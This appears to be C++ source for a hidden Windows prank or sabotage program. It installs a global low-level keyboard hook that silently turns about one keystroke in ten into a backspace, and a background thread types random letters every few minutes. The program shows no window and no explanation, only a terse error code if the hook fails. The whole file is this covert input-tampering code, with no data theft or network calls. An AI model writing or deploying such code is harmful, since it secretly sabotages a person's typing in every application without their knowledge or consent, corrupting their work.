#include <windows.h>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>

using namespace std;

INPUT input1 = { 0 };
INPUT input2 = { 0 };

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        if ((rand() % 10) == 0) {
            input1 = { 0 };
            input1.type = INPUT_KEYBOARD;
            input1.ki.wVk = VK_BACK;
            SendInput(1, &input1, sizeof(INPUT));
            return 1;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void RandomKeyPresser() {
    while (true) {
        //this_thread::sleep_for(chrono::milliseconds((rand() % 6 + 5) * 1000));
        this_thread::sleep_for(chrono::milliseconds((rand() % 181 + 120) * 1000));

        input2 = { 0 };
        input2.type = INPUT_KEYBOARD;
        int key;
        if (rand() % 2 == 0) {
            key = (rand() % 26) + 65;
        }
        else {
            key = (rand() % 26) + 97;
        }
        input2.ki.wVk = key;
        SendInput(1, &input2, sizeof(INPUT));
    }
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    srand(static_cast<unsigned int>(time(nullptr)));

    thread randomKeyThread(RandomKeyPresser);

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook) {
        MessageBox(NULL, L"0x1", L"ERROR", MB_ICONERROR); //means 'Hook has not been installed successfully'
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
